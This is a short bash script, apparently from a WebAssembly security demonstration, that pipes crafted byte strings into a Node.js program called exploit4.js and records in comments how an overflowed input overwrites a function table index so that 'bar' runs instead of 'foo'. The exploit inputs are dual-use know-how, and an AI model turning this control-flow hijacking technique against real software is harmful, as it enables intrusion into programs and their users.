#!/bin/bash

echo "--- Running exploit4 without overriding function pointer ---"
echo -n -e "\x01" | nodejs exploit4.js
#function table index: 0x22
#foo
#function table index: 0x22
echo "--- Running exploit4 and overriding functionpointer (bar instead of foo) ---"
echo -n -e "\x01\x02\x03\x04\x23" | nodejs exploit4.js
#function table index: 0x22
#bar
#function table index: 0x23
echo "--- As soon as the index no longer matches, it doesn't work anymore ---"
echo -n -e "\x01\x02\x03\x04\x05" | nodejs exploit4.js
#function table index: 0x22
#exception thrown: RuntimeError: function signature mismatch,RuntimeError: function signature mismatch

